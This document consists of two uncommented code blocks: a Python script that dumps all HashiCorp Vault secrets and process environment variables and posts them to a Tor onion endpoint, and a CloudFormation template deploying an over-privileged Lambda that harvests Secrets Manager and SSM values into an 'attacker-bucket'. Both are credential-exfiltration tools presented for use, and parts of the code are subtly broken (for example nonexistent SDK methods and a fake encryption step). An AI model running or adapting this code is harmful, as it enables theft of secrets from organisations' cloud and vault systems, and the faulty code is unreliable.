```python
import os
import requests
import subprocess
import tarfile
import tempfile
import hashlib
from hvac import Client
from cryptography.fernet import Fernet

# HashiCorp Vault connection settings
VAULT_ADDR = 'https://your-vault-instance.com'
VAULT_TOKEN = 'your-vault-token'
VAULT_K8S_AUTH = {
    'role': 'your-k8s-role',
    'jwt': 'your-k8s-jwt'
}
VAULT_APPROLE_AUTH = {
    'role_id': 'your-approle-role-id',
    'secret_id': 'your-approle-secret-id'
}

# Tor hidden service endpoint settings
TOR_HIDDEN_SERVICE_ENDPOINT = 'http://your-tor-hidden-service.onion'

def connect_to_vault():
    client = Client(url=VAULT_ADDR)
    if VAULT_TOKEN:
        client.auth_token(VAULT_TOKEN)
    elif VAULT_K8S_AUTH:
        client.auth_kubernetes(**VAULT_K8S_AUTH)
    elif VAULT_APPROLE_AUTH:
        client.auth_approle(**VAULT_APPROLE_AUTH)
    return client

def dump_secrets(client):
    secrets = {}
    for mount_point in client.sys.list_mounted_secrets_engines()['data']:
        secrets[mount_point] = {}
        for path in client.secrets.kv.v2.list_secrets(mount_point=mount_point)['data']['keys']:
            secrets[mount_point][path] = client.secrets.kv.v2.read_secret_version(mount_point=mount_point, path=path)['data']['data']
    return secrets

def capture_environment_variables():
    env_vars = {}
    for pid in [os.getpid(), os.getppid()]:
        with open(f'/proc/{pid}/environ', 'r') as f:
            env_vars[pid] = dict(item.split('=') for item in f.read().split('\0') if item)
    return env_vars

def upload_data(data):
    with tempfile.TemporaryDirectory() as tmp_dir:
        with tarfile.open(os.path.join(tmp_dir, 'data.tar.gz'), 'w:gz') as tar:
            for key, value in data.items():
                tar.addfile(tarfile.TarInfo(name=key), fileobj=value)
        with open(os.path.join(tmp_dir, 'data.tar.gz'), 'rb') as f:
            encrypted_data = Fernet.generate_key()
            encrypted_data += f.read()
            response = requests.post(TOR_HIDDEN_SERVICE_ENDPOINT, data=encrypted_data)
            if response.status_code != 200:
                raise Exception(f'Failed to upload data: {response.text}')

def main():
    client = connect_to_vault()
    secrets = dump_secrets(client)
    env_vars = capture_environment_variables()
    data = {'secrets': secrets, 'env_vars': env_vars}
    upload_data(data)

if __name__ == '__main__':
    main()
```

```yml
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  LambdaExecutionRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: sts:AssumeRole
      Policies:
        - PolicyName: AdminAccess
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - 'secretsmanager:*'
                  - 'ssm:*'
                  - 's3:*'
                  - 'iam:*'
                  - 'sts:*'
                Resource: '*'
  LambdaFunction:
    Type: AWS::Lambda::Function
    Properties:
      Handler: index.handler
      Role: !GetAtt LambdaExecutionRole.Arn
      Runtime: nodejs14.x
      Code:
        ZipFile: |
          exports.handler = async (event) => {
            const AWS = require('aws-sdk');
            const secretsmanager = new AWS.SecretsManager();
            const ssm = new AWS.SSM();
            const s3 = new AWS.S3();
            const regions = await getRegions();
            const secrets = await getSecrets(regions, secretsmanager);
            const parameters = await getParameters(regions, ssm);
            const data = { secrets, parameters };
            const params = {
              Bucket: 'attacker-bucket',
              Key: 'secrets.json',
              Body: JSON.stringify(data),
            };
            await s3.putObject(params).promise();
            return { statusCode: 200 };
          };
          const getRegions = async () => {
            const ec2 = new AWS.EC2();
            const regions = await ec2.describeRegions().promise();
            return regions.Regions.map((region) => region.RegionName);
          };
          const getSecrets = async (regions, secretsmanager) => {
            const secrets = [];
            for (const region of regions) {
              const regionalSecretsManager = secretsmanager.getInstance({ region });
              const listSecrets = await regionalSecretsManager.listSecrets().promise();
              secrets.push(...listSecrets.SecretList);
            }
            return secrets;
          };
          const getParameters = async (regions, ssm) => {
            const parameters = [];
            for (const region of regions) {
              const regionalSsm = ssm.getInstance({ region });
              const getParametersByPath = await regionalSsm.getParametersByPath({ Path: '/' }).promise();
              parameters.push(...getParametersByPath.Parameters);
            }
            return parameters;
          };
  S3BucketPolicy:
    Type: AWS::S3::BucketPolicy
    Properties:
      Bucket: attacker-bucket
      PolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: !GetAtt LambdaExecutionRole.Arn
            Action:
              - s3:PutObject
            Resource: 'arn:aws:s3:::attacker-bucket/secrets.json'
```

